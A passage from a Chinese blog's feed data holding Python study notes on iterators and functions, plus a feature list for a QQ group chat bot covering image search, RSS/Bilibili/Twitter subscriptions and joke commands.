class="line">True</span><br></pre></td></tr></table></figure><p>你可能会问，为什么<code>list</code>、<code>dict</code>、<code>str</code>等数据类型不是<code>Iterator</code>？</p><p>这是因为 Python 的<code>Iterator</code>对象表示的是一个数据流，Iterator 对象可以被<code>next()</code>函数调用并不断返回下一个数据，直到没有数据时抛出<code>StopIteration</code>错误。可以把这个数据流看做是一个有序序列，但我们却不能提前知道序列的长度，只能不断通过<code>next()</code>函数实现按需计算下一个数据，所以<code>Iterator</code>的计算是惰性的，只有在需要返回下一个数据时它才会计算。</p><p><code>Iterator</code>甚至可以表示一个无限大的数据流，例如全体自然数。而使用 list 是永远不可能存储全体自然数的。</p><blockquote><p>小结：</p></blockquote><p>凡是可作用于<code>for</code>循环的对象都是<code>Iterable</code>类型；</p><p>凡是可作用于<code>next()</code>函数的对象都是<code>Iterator</code>类型，它们表示一个惰性计算的序列；</p><p>集合数据类型如<code>list</code>、<code>dict</code>、<code>str</code>等是<code>Iterable</code>但不是<code>Iterator</code>，不过可以通过<code>iter()</code>函数获得一个<code>Iterator</code>对象。</p><p>Python 的<code>for</code>循环本质上就是通过不断调用<code>next()</code>函数实现的，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for x in [1, 2, 3, 4, 5]:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>实际上完全等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 首先获得Iterator对象:</span><br><span class="line">it = iter([1, 2, 3, 4, 5])</span><br><span class="line"># 循环:</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        # 获得下一个值:</span><br><span class="line">        x = next(it)</span><br><span class="line">    except StopIteration:</span><br><span class="line">        # 遇到StopIteration就退出循环</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><h2 id="3-6-参考资料"><a href="#3-6-参考资料" class="headerlink" title="3.6 参考资料"></a>3.6 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017269809315232">廖雪峰 - Python 3.x - 高级特性</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 高级特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿想1号的功能清单</title>
      <link href="/94.html"/>
      <url>/94.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>此处会列出本机器人所含的大致功能</p></blockquote><h1 id="基础服务-机器人帮助"><a href="#基础服务-机器人帮助" class="headerlink" title="基础服务-机器人帮助"></a>基础服务-机器人帮助</h1><h2 id="服务基础信息"><a href="#服务基础信息" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 帮助</li><li>说明: bot的食用指南~</li><li>权限: 所有人</li></ul><hr><h2 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h2><ul><li>说明: 获取食用bot的方法</li><li>权限: 所有人</li><li>需要at: 是</li><li>更多别名: menu</li></ul><h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><ul><li>说明: 获取关于bot的信息</li><li>权限: 所有人</li><li>需要at: 是</li><li>更多别名: about</li></ul><h2 id="服务列表"><a href="#服务列表" class="headerlink" title="服务列表"></a>服务列表</h2><ul><li>说明: 获取服务列表</li><li>权限: 所有人</li><li>需要at: 是</li><li>更多别名: 功能列表</li></ul><h2 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h2><ul><li>说明: 获取对应服务详细信息</li><li>权限: 所有人</li><li>需要at: 是</li><li>更多别名: help</li></ul><h1 id="基础服务-机器人状态"><a href="#基础服务-机器人状态" class="headerlink" title="基础服务-机器人状态"></a>基础服务-机器人状态</h1><h2 id="服务基础信息-1"><a href="#服务基础信息-1" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 状态</li><li>说明: 检查自身状态</li><li>权限: 所有人</li></ul><hr><h2 id="ping"><a href="#ping" class="headerlink" title="&#x2F;ping"></a>&#x2F;ping</h2><ul><li>说明: 检测bot简单信息处理速度</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="status"><a href="#status" class="headerlink" title="&#x2F;status"></a>&#x2F;status</h2><ul><li>说明: 查看运行资源占用</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="基础服务-用户反馈"><a href="#基础服务-用户反馈" class="headerlink" title="基础服务-用户反馈"></a>基础服务-用户反馈</h1><h2 id="服务基础信息-2"><a href="#服务基础信息-2" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 反馈</li><li>说明: 向维护者发送消息</li><li>权限: 所有人</li></ul><hr><h2 id="来杯红茶"><a href="#来杯红茶" class="headerlink" title="来杯红茶"></a>来杯红茶</h2><ul><li>说明: 向维护者发送消息</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="服务-kimo"><a href="#服务-kimo" class="headerlink" title="服务-kimo"></a>服务-kimo</h1><h2 id="服务基础信息-3"><a href="#服务基础信息-3" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: kimo</li><li>说明: 好像有点涩？</li><li>权限: 所有人</li></ul><hr><h2 id="叫我"><a href="#叫我" class="headerlink" title="叫我"></a>叫我</h2><ul><li>说明: 更改kimo时的称呼</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="服务-在线运行代码"><a href="#服务-在线运行代码" class="headerlink" title="服务-在线运行代码"></a>服务-在线运行代码</h1><h2 id="服务基础信息-4"><a href="#服务基础信息-4" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 在线跑代码</li><li>说明: 在线跑代码</li><li>权限: 所有人</li></ul><hr><h2 id="code"><a href="#code" class="headerlink" title="&#x2F;code"></a>&#x2F;code</h2><ul><li>说明: 在线运行一段代码，获取帮助：&#x2F;code.help</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="code-help"><a href="#code-help" class="headerlink" title="&#x2F;code.help"></a>&#x2F;code.help</h2><ul><li>说明: 使用说明</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="code-list"><a href="#code-list" class="headerlink" title="&#x2F;code.list"></a>&#x2F;code.list</h2><ul><li>说明: 查看支持的语言</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="服务-乐"><a href="#服务-乐" class="headerlink" title="服务-乐"></a>服务-乐</h1><h2 id="服务基础信息-5"><a href="#服务基础信息-5" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 乐</li><li>说明: 乐1乐，莫当真</li><li>权限: 所有人</li></ul><hr><h2 id="来句笑话"><a href="#来句笑话" class="headerlink" title="来句笑话"></a>来句笑话</h2><ul><li>说明: 隐晦的笑话…</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="大-今明后-天-吃-什啥-么"><a href="#大-今明后-天-吃-什啥-么" class="headerlink" title="大?[今明后]天(.*?)吃[什啥]么?"></a>大?[今明后]天(.*?)吃[什啥]么?</h2><ul><li>说明: 我来决定你吃什么！</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="服务-以图搜图"><a href="#服务-以图搜图" class="headerlink" title="服务-以图搜图"></a>服务-以图搜图</h1><h2 id="服务基础信息-6"><a href="#服务基础信息-6" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 以图搜图</li><li>说明: 以图搜图，仅限二刺螈，据说连本子都能搜</li><li>权限: 所有人</li></ul><hr><h2 id="以图搜图"><a href="#以图搜图" class="headerlink" title="以图搜图"></a>以图搜图</h2><ul><li>说明: 透过一张图搜索可能的来源</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="服务-涩图"><a href="#服务-涩图" class="headerlink" title="服务-涩图"></a>服务-涩图</h1><h2 id="服务基础信息-7"><a href="#服务基础信息-7" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 涩图</li><li>说明: hso!</li><li>权限: 所有人</li></ul><hr><h2 id="来张涩图"><a href="#来张涩图" class="headerlink" title="来张涩图"></a>来张涩图</h2><ul><li>说明: 来张随机涩图，冷却2分钟</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 涩图来、来点涩图、来份涩图</li></ul><h2 id="来张点丶份的-涩色-图"><a href="#来张点丶份的-涩色-图" class="headerlink" title="来张点丶份的[涩色?]图"></a>来<a href=".*?">张点丶份</a>的[涩色?]图</h2><ul><li>说明: 根据提供的tag查找涩图，冷却2分钟</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="nsfw"><a href="#nsfw" class="headerlink" title="&#x2F;nsfw"></a>&#x2F;nsfw</h2><ul><li>说明: 涩值检测</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="嗅探设置"><a href="#嗅探设置" class="headerlink" title="嗅探设置"></a>嗅探设置</h2><ul><li>说明: 涩图检测图片文件大小设置</li><li>权限: 超级用户</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="服务-小工具"><a href="#服务-小工具" class="headerlink" title="服务-小工具"></a>服务-小工具</h1><h2 id="服务基础信息-8"><a href="#服务基础信息-8" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 小工具</li><li>说明: 非常实用（？）的工具们！</li><li>权限: 所有人</li></ul><hr><h2 id="roll"><a href="#roll" class="headerlink" title="&#x2F;roll"></a>&#x2F;roll</h2><ul><li>说明: 骰子~用法：1d10 或 2d10+2d10+more</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="roll-1"><a href="#roll-1" class="headerlink" title="&#x2F;roll"></a>&#x2F;roll</h2><ul><li>说明: 骰子~用法：1d10 或 2d10+2d10+more</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><ul><li>说明: 我们之间的秘密❤</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><ul><li>说明: 解开我们的秘密❤</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="涩批一下"><a href="#涩批一下" class="headerlink" title="涩批一下"></a>涩批一下</h2><ul><li>说明: 将正常的句子涩一涩~</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="服务-群老婆"><a href="#服务-群老婆" class="headerlink" title="服务-群老婆"></a>服务-群老婆</h1><h2 id="服务基础信息-9"><a href="#服务基础信息-9" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 老婆</li><li>说明: 老婆…嘿嘿嘿…</li><li>权限: 所有人</li></ul><hr><h2 id="抽老婆"><a href="#抽老婆" class="headerlink" title="抽老婆"></a>抽老婆</h2><ul><li>说明: 随机选择一位幸运裙友成为老婆！</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="老婆"><a href="#老婆" class="headerlink" title="老婆"></a>老婆</h2><ul><li>说明: 呼唤老婆&#x2F;老公！</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 老公、老婆！、老公！</li></ul><h2 id="我要离婚"><a href="#我要离婚" class="headerlink" title="我要离婚"></a>我要离婚</h2><ul><li>说明: 离婚！</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="服务-以图搜番"><a href="#服务-以图搜番" class="headerlink" title="服务-以图搜番"></a>服务-以图搜番</h1><h2 id="服务基础信息-10"><a href="#服务基础信息-10" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 以图搜番</li><li>说明: 通过一张图片搜索你需要的番！据说里*也可以</li><li>权限: 所有人</li></ul><hr><h2 id="以图搜番"><a href="#以图搜番" class="headerlink" title="以图搜番"></a>以图搜番</h2><ul><li>说明: 发送一张图以搜索可能的番剧</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="服务-B站动态推送"><a href="#服务-B站动态推送" class="headerlink" title="服务-B站动态推送"></a>服务-B站动态推送</h1><h2 id="服务基础信息-11"><a href="#服务基础信息-11" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: b站动态订阅</li><li>说明: b站动态订阅助手～</li><li>权限: 所有人</li></ul><hr><h2 id="bd-add"><a href="#bd-add" class="headerlink" title="&#x2F;bd.add"></a>&#x2F;bd.add</h2><ul><li>说明: 添加b站up主订阅</li><li>权限: 超级用户、群管理</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="bd-del"><a href="#bd-del" class="headerlink" title="&#x2F;bd.del"></a>&#x2F;bd.del</h2><ul><li>说明: 添加b站up主订阅</li><li>权限: 超级用户、群管理</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="bd-list"><a href="#bd-list" class="headerlink" title="&#x2F;bd.list"></a>&#x2F;bd.list</h2><ul><li>说明: 获取b站up主订阅列表</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="bd-limit"><a href="#bd-limit" class="headerlink" title="&#x2F;bd.limit"></a>&#x2F;bd.limit</h2><ul><li>说明: 设置订阅内容字数限制</li><li>权限: 超级用户</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="服务-拍立得"><a href="#服务-拍立得" class="headerlink" title="服务-拍立得"></a>服务-拍立得</h1><h2 id="服务基础信息-12"><a href="#服务基础信息-12" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 拍立得</li><li>说明: 根据头像生成拍立得风格照片！</li><li>权限: 所有人</li></ul><hr><h2 id="拍立得"><a href="#拍立得" class="headerlink" title="拍立得"></a>拍立得</h2><ul><li>说明: 获取一张以自己头像的拍立得图片！需at</li><li>权限: 所有人</li><li>需要at: 是</li><li>更多别名: 无</li></ul><h1 id="服务-Twitter动态订阅"><a href="#服务-Twitter动态订阅" class="headerlink" title="服务-Twitter动态订阅"></a>服务-Twitter动态订阅</h1><h2 id="服务基础信息-13"><a href="#服务基础信息-13" class="headerlink" title="服务基础信息"></a>服务基础信息</h2><ul><li>名称: 推特动态订阅</li><li>说明: 推特动态订阅助手～</li><li>权限: 所有人</li></ul><hr><h2 id="td-add"><a href="#td-add" class="headerlink" title="&#x2F;td.add"></a>&#x2F;td.add</h2><ul><li>说明: 添加推主订阅</li><li>权限: 超级用户、群管理</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="td-del"><a href="#td-del" class="headerlink" title="&#x2F;td.del"></a>&#x2F;td.del</h2><ul><li>说明: 删除推主订阅</li><li>权限: 超级用户、群管理</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h2 id="td-list"><a href="#td-list" class="headerlink" title="&#x2F;td.list"></a>&#x2F;td.list</h2><ul><li>说明: 获取本群推主订阅列表</li><li>权限: 所有人</li><li>需要at: 否</li><li>更多别名: 无</li></ul><h1 id="订阅-RSS-并实时推送"><a href="#订阅-RSS-并实时推送" class="headerlink" title="订阅 RSS 并实时推送"></a>订阅 RSS 并实时推送</h1><h2 id="添加订阅"><a href="#添加订阅" class="headerlink" title="添加订阅"></a>添加订阅</h2><blockquote><p>命令：add （添加订阅、sub）</p><p>参数：订阅名 [RSS 地址]</p><p>示例： add test twitter&#x2F;user&#x2F;huagequan</p><p>使用技巧：先快速添加订阅，之后再 通过 change 命令修改</p><p>命令解释：</p><p>必需 订阅名 及 RSS地址（RSSHub订阅源可以省略域名，其余需要完整的URL地址） 两个参数，<br>订阅到当前 群组 、 频道 或 QQ。</p></blockquote><h2 id="添加-RSSHub-订阅"><a href="#添加-RSSHub-订阅" class="headerlink" title="添加 RSSHub 订阅"></a>添加 RSSHub 订阅</h2><blockquote><p>命令：rsshub_add</p><p>参数：[RSSHub 路由名] [订阅名]</p><p>示例： rsshub_add github</p><p>命令解释：</p><p>发送命令后，按照提示依次输入RSSHub 路由、订阅名和路由参数</p></blockquote><h2 id="删除订阅"><a href="#删除订阅" class="headerlink" title="删除订阅"></a>删除订阅</h2><blockquote><p>命令：deldy （删除订阅、drop）</p><p>参数：订阅名</p><p>示例： deldy test</p><p>命令解释：</p><ol><li>在超级管理员私聊使用该命令时，可完全删除该订阅</li><li>在群组使用该命令时，将 该群组 从 订阅群组 中删除</li><li>在子频道使用该命令时，将 该子频道 从 订阅子频道 中删除</li></ol></blockquote><h2 id="所有订阅"><a href="#所有订阅" class="headerlink" title="所有订阅"></a>所有订阅</h2><blockquote><p>命令：show_all（showall，select_all，selectall，所有订阅）</p><p>参数：[关键词]（支持正则，过滤生效范围：订阅名、订阅地址、QQ号、群号）</p><p>示例： showall test showall 123</p><p>命令解释：</p><ol><li>携带 关键词 参数时，展示该 群组 或 子频道 或 所有 订阅中含有关键词的订阅</li><li>不携带 关键词 参数时，展示该 群组 或 子频道 或 所有 订阅</li><li>当 关键词 参数为整数时候，只对超级管理员用户额外展示所有订阅中 QQ号 或 群号 含有关键词的订阅</li></ol></blockquote><h2 id="查看订阅"><a href="#查看订阅" class="headerlink" title="查看订阅"></a>查看订阅</h2><blockquote><p>命令：show（查看订阅）</p><p>参数：[订阅名]</p><p>示例： show test</p><p>命令解释：</p><ol><li>携带 订阅名 参数时，展示该订阅的详细信息</li><li>不携带 订阅名 参数时，展示该 群组 或 子频道 或 QQ 的订阅详情</li></ol></blockquote><h2 id="修改订阅"><a href="#修改订阅" class="headerlink" title="修改订阅"></a>修改订阅</h2><blockquote><p>命令：change（修改订阅，moddy）</p><p>参数：订阅名[,订阅名,…] 属性&#x3D;值[ 属性&#x3D;值 …]</p><p>示例： change test1[,test2,…] qq&#x3D;,123,234 qun&#x3D;-1</p><p>使用技巧：可以先只发送 change ，机器人会返回提示信息，无需记住复杂的参数列表</p><p>对应参数:</p><p>修改项</p><p>参数名</p><p>值范围</p><p>备注</p><p>订阅名</p><p>-name</p><p>无空格字符串</p><p>禁止将多个订阅批量改名，会因为名称相同起冲突</p><p>订阅链接</p><p>-url</p><p>无空格字符串</p><p>RSSHub 订阅源可以省略域名，其余需要完整的 URL 地址</p><p>QQ号</p><p>-qq</p><p>正整数 &#x2F; -1</p><p>需要先加该对象好友；前加英文逗号表示追加；-1 设为空</p><p>QQ群</p><p>-qun</p><p>正整数 &#x2F; -1</p><p>需要先加入该群组；前加英文逗号表示追加；-1 设为空</p><p>更新频率</p><p>-time</p><p>正整数 &#x2F; crontab 字符串</p><p>值为整数时表示每 x 分钟进行一次检查更新，且必须大于等于 1<br>值为 crontab 字符串时，详见表格下方的补充说明</p><p>代理</p><p>-proxy</p><p>1 &#x2F; 0</p><p>是否启用代理</p><p>翻译</p><p>-tl</p><p>1 &#x2F; 0</p><p>是否翻译正文内容</p><p>仅标题</p><p>-ot</p><p>1 &#x2F; 0</p><p>是否仅发送标题</p><p>仅图片</p><p>-op</p><p>1 &#x2F; 0</p><p>是否仅发送图片(正文中只保留图片)</p><p>仅含有图片</p><p>-ohp</p><p>1 &#x2F; 0</p><p>仅含有图片不同于仅图片，除了图片还会发送正文中的其他文本信息</p><p>下载种子</p><p>-downopen</p><p>1 &#x2F; 0</p><p>是否进行BT下载(需要配置 qBittorrent，参考：<a href="%E9%83%A8%E7%BD%B2%E6%95%99%E7%A8%8B.md#%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%83%A8%E7%BD%B2">第一次部署</a>)</p><p>白名单关键词</p><p>-wkey</p><p>无空格字符串 &#x2F; 空</p><p>支持正则表达式，匹配时推送消息及下载；设为空(wkey&#x3D;)时不生效</p><p>黑名单关键词</p><p>-bkey</p><p>无空格字符串 &#x2F; 空</p><p>同白名单关键词，但匹配时不推送，可在避免冲突的情况下组合使用</p><p>种子上传到群</p><p>-upgroup</p><p>1 &#x2F; 0</p><p>是否将BT下载完成的文件上传到群(需要配置 qBittorrent，参考：<a href="%E9%83%A8%E7%BD%B2%E6%95%99%E7%A8%8B.md#%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%83%A8%E7%BD%B2">第一次部署</a>)</p><p>去重模式</p><p>-mode</p><p>link &#x2F; title &#x2F; image &#x2F; or &#x2F; -1</p><p>分为按链接(link)、标题(title)、图片(image)判断<br>其中 image 模式，出于性能考虑以及避免误伤情况发生，生效对象限定为只带 1 张图片的消息<br>此外，如果属性中带有 or 说明判断逻辑是任一匹配即去重，默认为全匹配<br>-1 设为禁用</p><p>图片数量限制</p><p>-img_num</p><p>正整数</p><p>只发送限定数量的图片，防止刷屏</p><p>正文待移除内容</p><p>-rm_list</p><p>无空格字符串 &#x2F; -1</p><p>从正文中要移除的指定内容，支持正则表达式<br>因为参数解析的缘故，格式必须如：rm_list&#x3D;’a’ 或 rm_list&#x3D;’a’,’b’<br>该处理过程是在解析 html 标签后进行的<br>要将该参数设为空，使用 rm_list&#x3D;’-1’</p><p>停止更新</p><p>-stop</p><p>1 &#x2F; 0</p><p>对订阅停止、恢复检查更新</p><p><strong>注：</strong></p><p>各个属性之间使用<strong>空格</strong>分割</p><p>time属性兼容 Linux crontab 格式，<strong>但不同的是，crontab 中的空格应该替换为 _ 即下划线</strong></p><p>可以参考 <a href="https://www.runoob.com/linux/linux-comm-crontab.html">Linux crontab 命令</a> 务必理解！但实际有少许不同，主要是设置第5个字段时，即每周有不同。</p><p>时间格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1_f2_f3_f4_f5</span><br></pre></td></tr></table></figure><ul><li>其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。</li><li>当 f1 为 <em>时表示每分钟都要执行 program，f2 为</em> 时表示每小时都要执行程序，其馀类推</li><li>当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推</li><li>当 f1 为 <em>&#x2F;n 时表示每 n 分钟个时间间隔执行一次，f2 为</em>&#x2F;n 表示每 n 小时个时间间隔执行一次，其馀类推</li><li>当 f1 为 a, b, c, … 时表示第 a, b, c, … 分钟要执行，f2 为 a, b, c, … 时表示第 a, b, c… 个小时要执行，其馀类推</li></ul><p><img src="https://cos.gjcloak.xyz/file/image-1657240670714.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-1657240670714" title="image-1657240670714"></p><p>以下是一些示例：<br><img src="https://cos.gjcloak.xyz/file/image-1657240730275.png?imageMogr2/format/webp/interlace/1/quality/80" alt="image-1657240730275" title="image-1657240730275"></p><h1 id="如果不生效请查看控制台输出"><a href="#如果不生效请查看控制台输出" class="headerlink" title="如果不生效请查看控制台输出"></a>如果不生效请查看控制台输出</h1></blockquote><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ul><li><a href="https://github.com/Quan666/ELF_RSS">ELF_RSS</a></li><li><a href="https://atri.kyomotoi.moe/">ATRI项目文档</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bot </tag>
            
            <tag> 机器人 </tag>
            
            <tag> 功能清单 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(二)·函数</title>
      <link href="/92.html"/>
      <url>/92.html</url>
      
        <content type="html"><![CDATA[<p>我们知道圆的面积计算公式为：</p><p>$$ S &#x3D; πr^2 $$</p><p>当我们知道半径<code>r</code>的值时，就可以根据公式计算出面积。</p><p>假设我们需要计算 3 个不同大小的圆的面积：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r1 = 12.34</span><br><span class="line">r2 = 9.08</span><br><span class="line">r3 = 73.1</span><br><span class="line">s1 = 3.14 * r1 * r1</span><br><span class="line">s2 = 3.14 * r2 * r2</span><br><span class="line">s3 = 3.14 * r3 * r3</span><br></pre></td></tr></table></figure><p>当代码出现有规律的重复的时候，你就需要当心了，每次写<code>3.14 * x * x</code>不仅很麻烦，而且，如果要把<code>3.14</code>改成<code>3.14159265359</code>的时候，得全部替换。</p><p>有了函数，我们就不再每次写<code>s = 3.14 * x * x</code>，而是写成更有意义的函数调用<code>s = area_of_circle(x)</code>，而函数<code>area_of_circle</code>本身只需要写一次，就可以多次调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def area_of_circle(r):</span><br><span class="line">    if r&gt;0:</span><br><span class="line">        return 3.14*r**2</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line">R=[12.34,9.08,73.1]</span><br><span class="line">for r in R:</span><br><span class="line">    s=area_of_circle(r)</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure><p>基本上所有的高级语言都支持函数，Python 也不例外。Python 不但能非常灵活地定义函数，而且本身内置了很多有用的函数，可以直接调用。</p><p>!&gt; 注：抽象是数学中非常常见的概念，借助抽象，我们才能不关心底层的具体计算过程，而直接在更高的层次上思考问题。写计算机程序也是一样，函数就是最基本的一种代码抽象的方式。</p><h2 id="2-1-调用函数"><a href="#2-1-调用函数" class="headerlink" title="2.1 调用函数"></a>2.1 调用函数</h2><h3 id="2-1-1-内置函数"><a href="#2-1-1-内置函数" class="headerlink" title="2.1.1 内置函数"></a>2.1.1 内置函数</h3><p>Python 内置了很多有用的函数，我们可以直接调用。</p><p>要调用一个函数，需要知道函数的名称和参数，比如求绝对值的函数<code>abs</code>，只有一个参数。可以直接从 Python 的官方网站查看文档：</p><p><a href="https://docs.python.org/3/library/functions.html#abs">https://docs.python.org/3/library/functions.html#abs</a></p><p>也可以在交互式命令行通过<code>help(abs)</code>查看<code>abs</code>函数的帮助信息。</p><p>调用<code>abs</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(abs(-20)) #20</span><br><span class="line">print(abs(20)) #20</span><br></pre></td></tr></table></figure><p>调用函数的时候，如果传入的参数数量不对，会报<code>TypeError</code>的错误，并且 Python 会明确地告诉你：<code>abs()</code>有且仅有 1 个参数，但给出了两个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(abs(1, 2))</span><br></pre></td></tr></table></figure><p>报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;E:/ML/PycharmProjects/HelloWorld/app.py&quot;, line 11, in &lt;module&gt;</span><br><span class="line">    print(abs(1, 2))</span><br><span class="line">TypeError: abs() takes exactly one argument (2 given)</span><br></pre></td></tr></table></figure><p>如果传入的参数数量是对的，但参数类型不能被函数所接受，也会报<code>TypeError</code>的错误，并且给出错误信息：<code>str</code>是错误的参数类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(abs(&#x27;a&#x27;))</span><br></pre></td></tr></table></figure><p>报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;E:/ML/PycharmProjects/HelloWorld/app.py&quot;, line 11, in &lt;module&gt;</span><br><span class="line">    print(abs(&#x27;a&#x27;))</span><br><span class="line">TypeError: bad operand type for abs(): &#x27;str&#x27;</span><br></pre></td></tr></table></figure><p>而<code>max</code>函数<code>max()</code>可以接收任意多个参数，并返回最大的那个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(max(1, 2)) # 2</span><br><span class="line">print(max(2, 3, 1, -5)) # 3</span><br></pre></td></tr></table></figure><h3 id="2-1-2-数据类型转换"><a href="#2-1-2-数据类型转换" class="headerlink" title="2.1.2 数据类型转换"></a>2.1.2 数据类型转换</h3><p>Python 内置的常用函数还包括数据类型转换函数：int 把其他数据类型转换为整数 &#x2F; float &#x2F; str &#x2F; bool</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int(&#x27;123&#x27;) # 123</span><br><span class="line">int(12.34) # 12</span><br><span class="line">float(&#x27;12.34&#x27;) # 12.34</span><br><span class="line">str(1.23) # &#x27;1.23&#x27;</span><br><span class="line">str(100) # &#x27;100&#x27;</span><br><span class="line">bool(1) # True</span><br><span class="line">bool(&#x27;&#x27;) # 